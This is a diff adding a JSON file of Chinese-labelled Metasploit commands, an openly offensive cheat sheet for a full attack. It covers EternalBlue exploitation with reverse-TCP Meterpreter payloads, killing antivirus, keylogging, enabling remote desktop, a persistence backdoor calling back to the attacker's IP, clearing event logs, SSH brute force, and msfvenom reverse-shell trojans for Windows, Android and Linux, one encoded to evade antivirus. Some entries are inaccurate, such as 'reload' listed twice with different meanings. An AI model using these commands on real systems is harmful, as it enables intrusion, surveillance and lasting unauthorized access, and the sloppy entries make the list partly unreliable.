@@ -1,0 +1,204 @@
+{
+  “MSF 指令集”: [
+    {
+      “name”: “启动控制台与初始化”,
+      “command”: “msfconsole”
+    },
+    {
+      “name”: “创建工作空间 (避免混杂)”,
+      “command”: “workspace -a [工作空间名]”
+    },
+    {
+      “name”: “切换工作空间”,
+      “command”: “workspace [工作空间名]”
+    },
+    {
+      “name”: “连接数据库 (存储扫描结果)”,
+      “command”: “db_connect msf:[密码]@127.0.0.1/msf”
+    },
+    {
+      “name”: “查看数据库状态”,
+      “command”: “db_status”
+    },
+    {
+      “name”: “Nmap 扫描并自动导入结果”,
+      “command”: “db_nmap -sV -O [目标IP/网段]”
+    },
+    {
+      “name”: “搜索模块 (如永恒之蓝)”,
+      “command”: “search eternalblue”
+    },
+    {
+      “name”: “搜索模块 (按漏洞编号)”,
+      “command”: “search cve:2021-44228”
+    },
+    {
+      “name”: “搜索模块 (按类型)”,
+      “command”: “search type:exploit platform:windows”
+    },
+    {
+      “name”: “使用模块”,
+      “command”: “use exploit/windows/smb/ms17_010_eternalblue”
+    },
+    {
+      “name”: “显示模块信息与目标”,
+      “command”: “show info / show targets”
+    },
+    {
+      “name”: “显示可配置选项”,
+      “command”: “show options”
+    },
+    {
+      “name”: “设置目标主机 (RHOSTS)”,
+      “command”: “set RHOSTS [目标IP]”
+    },
+    {
+      “name”: “设置本地主机 (LHOST)”,
+      “command”: “set LHOST [你的攻击机IP]”
+    },
+    {
+      “name”: “设置端口 (RPORT/LPORT)”,
+      “command”: “set RPORT 445 / set LPORT 4444”
+    },
+    {
+      “name”: “设置载荷 (Payload)”,
+      “command”: “set PAYLOAD windows/x64/meterpreter/reverse_tcp”
+    },
+    {
+      “name”: “运行攻击/渗透”,
+      “command”: “run / exploit”
+    },
+    {
+      “name”: “后台运行攻击”,
+      “command”: “run -j / exploit -j”
+    },
+    {
+      “name”: “检查目标是否易受攻击”,
+      “command”: “check”
+    },
+    {
+      “name”: “进入 Meterpreter 会话”,
+      “command”: “sessions -i [会话ID]”
+    },
+    {
+      “name”: “列出所有会话”,
+      “command”: “sessions -l”
+    },
+    {
+      “name”: “升级为 Meterpreter 会话”,
+      “command”: “sessions -u [会话ID]”
+    },
+    {
+      “name”: “获取系统信息 (Meterpreter)”,
+      “command”: “sysinfo”
+    },
+    {
+      “name”: “获取当前用户 (Meterpreter)”,
+      “command”: “getuid”
+    },
+    {
+      “name”: “提权 (尝试)”,
+      “command”: “getsystem”
+    },
+    {
+      “name”: “查看进程 (Meterpreter)”,
+      “command”: “ps”
+    },
+    {
+      “name”: “迁移进程 (Meterpreter)”,
+      “command”: “migrate [进程PID]”
+    },
+    {
+      “name”: “文件系统交互 (Meterpreter)”,
+      “command”: “pwd / cd / ls / cat [文件] / upload [本地文件] / download [远程文件]”
+    },
+    {
+      “name”: “关闭杀毒软件 (Meterpreter)”,
+      “command”: “run killav”
+    },
+    {
+      “name”: “启用键盘记录 (Meterpreter)”,
+      “command”: “keyscan_start / keyscan_dump / keyscan_stop”
+    },
+    {
+      “name”: “启用远程桌面 (Meterpreter)”,
+      “command”: “run getgui -e”
+    },
+    {
+      “name”: “持久化后门 (Meterpreter)”,
+      “command”: “run persistence -S -U -i 30 -p 4444 -r [你的IP]”
+    },
+    {
+      “name”: “ARP 扫描 (辅助模块)”,
+      “command”: “use auxiliary/scanner/discovery/arp_sweep; set RHOSTS [网段]; run”
+    },
+    {
+      “name”: “端口扫描 (辅助模块)”,
+      “command”: “use auxiliary/scanner/portscan/tcp; set RHOSTS [目标]; run”
+    },
+    {
+      “name”: “SMB 版本扫描 (辅助模块)”,
+      “command”: “use auxiliary/scanner/smb/smb_version; set RHOSTS [目标]; run”
+    },
+    {
+      “name”: “SSH 暴力破解 (辅助模块)”,
+      “command”: “use auxiliary/scanner/ssh/ssh_login; set RHOSTS [目标]; set USER_FILE users.txt; set PASS_FILE passwords.txt; run”
+    },
+    {
+      “name”: “HTTP 漏洞扫描 (辅助模块)”,
+      “command”: “use auxiliary/scanner/http/dir_scanner; set RHOSTS [目标]; run”
+    },
+    {
+      “name”: “生成独立木马 (Payload)”,
+      “command”: “msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[你的IP] LPORT=4444 -f exe -o payload.exe”
+    },
+    {
+      “name”: “生成免杀木马 (编码)”,
+      “command”: “msfvenom -p windows/shell_reverse_tcp LHOST=[你的IP] LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_payload.exe”
+    },
+    {
+      “name”: “生成安卓木马”,
+      “command”: “msfvenom -p android/meterpreter/reverse_tcp LHOST=[你的IP] LPORT=4444 -o android_payload.apk”
+    },
+    {
+      “name”: “生成 Linux 木马”,
+      “command”: “msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[你的IP] LPORT=4444 -f elf -o payload.elf”
+    },
+    {
+      “name”: “清理痕迹 (Meterpreter)”,
+      “command”: “clearev”
+    },
+    {
+      “name”: “结束会话”,
+      “command”: “sessions -k [会话ID]”
+    },
+    {
+      “name”: “离开 Meterpreter”,
+      “command”: “background”
+    },
+    {
+      “name”: “重新加载模块 (修改后)”,
+      “command”: “reload”
+    },
+    {
+      “name”: “重置模块选项”,
+      “command”: “reload”
+    },
+    {
+      “name”: “查看命令历史”,
+      “command”: “history”
+    },
+    {
+      “name”: “资源脚本 (批量执行)”,
+      “command”: “resource [脚本路径]”
+    },
+    {
+      “name”: “保存当前设置”,
+      “command”: “save”
+    },
+    {
+      “name”: “退出控制台”,
+      “command”: “exit”
+    }
+  ]
+}
